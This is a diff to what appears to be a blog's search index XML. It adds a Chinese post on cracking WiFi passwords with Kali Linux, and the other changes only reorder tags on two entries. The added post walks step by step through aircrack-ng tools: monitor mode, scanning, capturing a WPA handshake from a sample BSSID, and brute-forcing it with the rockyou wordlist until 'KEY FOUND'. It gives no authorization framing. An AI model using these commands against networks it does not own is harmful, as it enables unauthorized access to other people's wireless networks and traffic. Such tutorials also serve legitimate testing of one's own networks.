@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>kail linux破解WiFi密码</title>
+      <link href="p/7d1w.html"/>
+      <url>p/7d1w.html</url>
+      
+        <content type="html"><![CDATA[<ol><li><p><code>airmon-ng start wlan0</code>开启网卡监听模式<br><img src="https://img-blog.csdnimg.cn/20190902145651742.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0NTI1MQ==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20190902145651742.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0NTI1MQ==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1"></p></li><li><p><code>iwconfig</code>命令查看网卡信息， wlan0mon网卡名加了mon则表示成功<br><img src="https://img-blog.csdnimg.cn/20190902145707834.jpg" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20190902145707834.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2"></p></li><li><p><code>airodump-ng wlan0mon</code>，开始扫描WiFi，按ctrl+c结束任务</p><blockquote><p>BSSID为wifi的MAC地址，PWR为信号强弱程度，数值越小信号越强；#DATA为数据量，越大使用的人就越多，CH为信道频率（频道），ESSID为wifi的名称，中文可能会有乱码</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190902145744390.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0NTI1MQ==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20190902145744390.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0NTI1MQ==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3"></p></li><li><p>接着输入<code>airodump-ng --bssid BSSID -c 信道频率 -w 抓包存储的路径 wlan0mon</code></p><blockquote><p>如：airodump-ng --bssid BC:5F:6F:3D:03:74 -c 13 -w /home/wifi wlan0mon</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190902145803930.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0NTI1MQ==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20190902145803930.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0NTI1MQ==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="4"></p></li><li><p>出现<strong>WPA handshake</strong>时，表示抓包成功<br><img src="https://img-blog.csdnimg.cn/20190902145825484.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0NTI1MQ==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20190902145825484.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0NTI1MQ==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="5"></p></li><li><p>按Ctrl+c停止，cd打开抓包的目录，ls列出来，就看到我们抓到的数据包<br><img src="https://img-blog.csdnimg.cn/20190902145840393.jpg" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20190902145840393.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="6"></p></li><li><p>解压kali自带的字典文件 路径：/usr/share/wordlists/rockyou.txt.gz</p><blockquote><p>如 ：gzip -d/usr/share/wordlists/rockyou.txt.gz</p></blockquote></li><li><p>键入 <code>aircrack-ng -w</code> 字典路径 握手包路径，回车后开始爆破</p><blockquote><p>如：aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/wifi-0.1.cap</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190902145858351.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0NTI1MQ==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20190902145858351.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0NTI1MQ==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="8"></p></li></ol><p>然后等待破解。。。</p><p>KEY FOUND</p><p><img src="https://i.loli.net/2020/12/08/J8hD3zvkneUGLVH.jpg" class="lazyload" data-srcset="https://i.loli.net/2020/12/08/J8hD3zvkneUGLVH.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3f6dca8e73137352e889734dbb0a477.jpg"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> kail </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Plugin caching_sha2_password could not be loaded</title>
       <link href="p/5c5b.html"/>
       <url>p/5c5b.html</url>
@@ -120,9 +145,9 @@
       
         <tags>
             
-            <tag> 知识记录 </tag>
-            
             <tag> flutter </tag>
+            
+            <tag> 知识记录 </tag>
             
         </tags>
       
@@ -249,9 +274,9 @@
       
         <tags>
             
-            <tag> 知识记录 </tag>
-            
             <tag> flutter </tag>
+            
+            <tag> 知识记录 </tag>
             
         </tags>
       
